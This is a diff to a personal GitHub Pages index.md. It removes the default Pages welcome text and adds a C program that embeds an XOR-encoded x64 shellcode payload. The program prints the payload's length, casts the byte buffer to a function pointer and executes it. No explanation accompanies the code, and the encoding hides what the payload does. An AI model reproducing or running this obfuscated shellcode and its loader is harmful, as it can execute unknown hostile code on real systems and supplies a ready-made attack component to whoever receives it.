@@ -1,37 +1,24 @@
 ## Welcome to GitHub Pages
 
-You can use the [editor on GitHub](https://github.com/0xHC/BlogIn/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+```c
+#include <stdio.h>
+#include <string.h>
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
 
-### Markdown
+int main(void)
+{
+    //
+    unsigned char buf[] =
+        "\x48\x31\xc9\x48\x81\xe9\xfc\xff\xff\xff\x48\x8d\x05\xef\xff"
+        "\xff\xff\x48\xbb\x95\xdb\xe9\x3a\xf5\xd2\xb2\x9b\x48\x31\x58"
+        "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xdd\xea\x3b\xd2\xf2\xd2"
+        "\xb2\x9b\xe2\xb3\x86\x5b\x98\xbb\xb2\xc4\xc7\x8c\xa1\xb3\x13"
+        "\x9a\x75\x5b\xae\xdb\xe9\x38\xfa\xd7\xb2\x9b";
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+    printf("Shellcode Length:  %lu\n", sizeof(buf) - 1);
+    int (*ret)() = (int(*)())buf;
+    ret();
+    return 0;
+}
 
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
 ```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/0xHC/BlogIn/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
